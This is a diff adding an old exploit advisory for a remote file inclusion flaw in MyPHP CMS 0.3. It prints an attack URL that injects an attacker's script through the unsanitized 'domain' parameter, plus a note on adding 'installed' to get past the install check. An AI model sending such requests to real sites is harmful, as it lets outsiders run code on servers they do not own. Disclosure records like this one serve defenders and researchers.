@@ -1,0 +1,65 @@
+---------------------------------------------------------------------------
+MyPHP CMS <= 0.3 (domain) Remote File Include Vulnerabilities
+---------------------------------------------------------------------------
+
+
+Discovered By Kw3[R]Ln [ Romanian Security Team ] : hTTp://RoSecurityGroup.net :
+Remote : Yes
+Critical Level : Dangerous
+
+---------------------------------------------------------------------------
+Affected software description :
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : MyPHP CMS
+version : latest version [ 0.3 ]
+URL : http://sourceforge.net/projects/myphpcms
+
+------------------------------------------------------------------
+Exploit:
+~~~~~~~
+
+Variable $domain not sanitized.When register_globals=on an attacker can exploit this vulnerability with a simple php injection script.
+
+
+# http://www.site.com/[path]/styles/default/global_header.php?installed=23&domain=[Evil_Script]
+
+---------------------------------------------------------------------------
+
+Solution :
+~~~~~~~~~
+
+declare variabel $domain
+---------------------------------------------------------------------------
+
+
+Shoutz:
+~~~~~
+
+# Special greetz to my good friend [Oo]
+# To all members of h4cky0u.org ;) and RST [ hTTp://RoSecurityGroup.net ]
+---------------------------------------------------------------------------
+
+*/
+
+Contact:
+~~~~~~~
+
+Nick: Kw3rLn
+E-mail: ciriboflacs[at]YaHoo[dot]Com
+Homepage: hTTp://RoSecurityGroup.net
+/*
+
+-------------------------------- [ EOF] ----------------------------------
+
+# Further Notes
+if ( !isset ( $installed ) )
+{
+        header ( "Location: install_sql.php" );
+}
+
+added installed to the get request for the vulnerability to work correctly.
+
+/str0ke
+
+# milw0rm.com [2006-07-05]
